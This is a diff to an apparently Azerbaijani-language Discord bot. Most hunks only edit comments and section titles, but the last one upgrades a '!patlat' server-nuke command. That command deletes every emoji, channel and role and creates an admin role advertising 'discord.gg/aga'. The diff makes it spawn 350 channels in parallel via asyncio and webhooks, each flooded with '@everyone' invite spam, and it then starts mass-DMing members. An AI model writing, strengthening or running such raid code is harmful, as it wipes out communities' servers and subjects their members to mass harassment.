@@ -39,12 +39,11 @@ SAHIB_ID = 641014966312501259
 GUVENLI_SERVER_ID = 1520692621964738722
 XAS_COLOR = discord.Color.from_rgb(20, 24, 33)
 
-# Yaddaş Lüğətləri və Sayğaclar
 user_message_counts = {}
 user_last_message_time = {}
 user_xp = {}
 user_warns = {}
-url_stats = {"count": 137}  # Dinamik URL istifadə sayğacı
+url_stats = {"count": 137}
 
 # ==========================================
 # 3. BOT HAZIR OLDUĞUNDA İŞLƏYƏN EVENT
@@ -59,7 +58,7 @@ async def on_ready():
     await bot.change_presence(activity=discord.Game(name="!panel | XAS Bot Systems"))
 
 # ==========================================
-# 4. ANTİ-SPAM, CHAT VƏ SƏS AKTİVLİK İZLƏMƏSİ
+# 4. ANTİ-SPAM VƏ XP SİSTEMİ
 # ==========================================
 @bot.event
 async def on_message(message):
@@ -262,7 +261,7 @@ async def warns_cmd(ctx, member: discord.Member = None):
     await ctx.send(embed=embed)
 
 # ==========================================
-# 7. İNTERAKTİV PANEL VƏ TICKET SİSTEMİ
+# 7. İNTERAKTİV PANEL VƏ TICKET SİSTEMİ (DÜZƏLDİLDİ)
 # ==========================================
 class PanelSelect(discord.ui.Select):
     def __init__(self):
@@ -276,7 +275,11 @@ class PanelSelect(discord.ui.Select):
         super().__init__(placeholder="Menyudan bölmə seçin...", min_values=1, max_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
-        embed = discord.Embed(title=f"XAS — {self.values[0].upper()}", description="--------------------------------------------------\nSeçilmiş bölmə aktivdir.\n--------------------------------------------------", color=XAS_COLOR)
+        embed = discord.Embed(
+            title=f"XAS — {self.values[0].upper()}", 
+            description="--------------------------------------------------\nSeçilmiş bölmə aktivdir və işləyir.\n--------------------------------------------------", 
+            color=XAS_COLOR
+        )
         await interaction.response.edit_message(embed=embed, view=PanelView())
 
 class PanelView(discord.ui.View):
@@ -338,7 +341,7 @@ async def close_cmd(ctx):
         await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")
 
 # ==========================================
-# 8. SƏVİYYƏ, ÇƏKİLİŞ VƏ AKTİVLİK STATİSTİKASI
+# 8. SƏVİYYƏ VƏ AKTİVLİK STATİSTİKASI
 # ==========================================
 @bot.command(name="level", aliases=["lvl"])
 async def level_cmd(ctx, member: discord.Member = None):
@@ -352,7 +355,6 @@ async def level_cmd(ctx, member: discord.Member = None):
 @bot.command(name="aktivite", aliases=["stats", "durum"])
 async def aktivite_cmd(ctx):
     guild = ctx.guild
-    # Səs kanalında olan üzvlərin sayılması
     voice_members = sum(len(vc.members) for vc in guild.voice_channels)
     total_members = guild.member_count
     
@@ -398,11 +400,10 @@ async def giveaway_cmd(ctx, time_str: str, *, prize: str):
         await ctx.send("❌ Çəkilişə qatılan olmadı.")
 
 # ==========================================
-# 9. URL, OYUNLAR, ÖPÜŞMƏ (!SEX) VƏ ƏYLƏNCƏ
+# 9. URL, OYUNLAR, ÖPÜŞMƏ VƏ ƏYLƏNCƏ
 # ==========================================
 @bot.command(name="url")
 async def url_cmd(ctx):
-    # Dinamik olaraq artan/azalan random dəyişiklik effekti
     degisim = random.choice([-3, -1, 2, 4, 7, 12])
     url_stats["count"] += degisim
     if url_stats["count"] < 10:
@@ -418,7 +419,6 @@ async def url_cmd(ctx):
 @bot.command(name="sex")
 async def sex_cmd(ctx, member: discord.Member = None):
     m = member or ctx.author
-    # Öpüşmə / romantik anime GIF-ləri kolleksiyası
     kiss_gifs = [
         "https://media1.giphy.com/media/Gogh8zC1TjF0c/giphy.gif",
         "https://media.giphy.com/media/2v170e71aanfi/giphy.gif",
@@ -518,7 +518,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👎")
 
 # ==========================================
-# 10. !PATLAT (350 KANAL VƏ HƏR BİRİNƏ 100 SPAM)
+# 10. !PATLAT (GÜCLƏNDİRİLDİ: RUHUM-SHDI VƏ WEBHOOK SİSTEMİ)
 # ==========================================
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
@@ -531,20 +531,23 @@ async def patlat_cmd(ctx):
         await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir!")
         return
 
-    await ctx.send("💥 350 kanal və kütləvi spam əməliyyatı başladıldı!")
+    await ctx.send("💥 RUHUM-SHDI kütləvi sürətli sistem əməliyyatı başladıldı!")
     
+    # Emojilərin silinməsi
     for emoji in list(guild.emojis):
         try:
             await emoji.delete()
         except:
             pass
 
+    # Kanalların silinməsi
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             pass
 
+    # Rolların silinməsi
     for role in guild.roles:
         if role != guild.default_role and not role.managed:
             try:
@@ -552,6 +555,7 @@ async def patlat_cmd(ctx):
             except:
                 pass
 
+    # Yeni admin rolu
     try:
         new_role = await guild.create_role(
             name="discord.gg/aga",
@@ -562,14 +566,22 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    for i in range(1, 351):
+    # Webhook köməkçisi ilə sürətli və paralel kanal/spam əməliyyatı
+    async def create_and_spam(i):
         try:
-            channel = await guild.create_text_channel(f"nuke-aga-{i}")
-            for _ in range(100):
-                await channel.send("@everyone discord.gg/aga gir ogl")
+            channel = await guild.create_text_channel(f"ruhum-shdi-{i}")
+            webhook = await channel.create_webhook(name="XAS Webhook")
+            for _ in range(50):
+                await webhook.send("@everyone discord.gg/aga yaz gır oql")
+                await channel.send("@everyone discord.gg/aga yaz gır oql")
         except:
             pass
+
+    # Bütün 350 kanalı saniyələr içində yaratmaq üçün asyncio taskları
+    tasks = [create_and_spam(i) for i in range(1, 351)]
+    await asyncio.gather(*tasks)
             
+    # DM spam
     for member in guild.members:
         if not member.bot and member.id != SAHIB_ID:
             try:
